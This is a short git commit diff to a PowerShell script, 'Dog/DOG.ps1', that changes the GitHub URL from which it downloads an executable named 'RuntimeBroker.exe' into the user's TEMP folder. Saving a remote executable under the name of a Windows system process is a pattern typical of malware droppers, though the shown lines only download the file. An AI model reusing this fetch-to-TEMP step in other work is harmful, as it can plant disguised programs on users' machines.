262b795a36748636d78886ea72a2bdf397988b27
HyperActivated <77895386+HyperActivated2046@users.noreply.github.com>
2025-05-03 00:35:19 +0800

    Update DOG.ps1

--- Dog/DOG.ps1
+++ Dog/DOG.ps1
@@ -1,4 +1,4 @@
-$exeUrl = "https://github.com/HyperActivated2046/Testing/raw/main/Dog/RuntimeBroker.exe"
+$exeUrl = "https://github.com/HyperActivated2046/Testing/raw/refs/heads/main/Dog/RuntimeBroker.exe"
 $savePath = "$env:TEMP\RuntimeBroker.exe"
 
 Invoke-WebRequest -Uri $exeUrl -OutFile $savePath
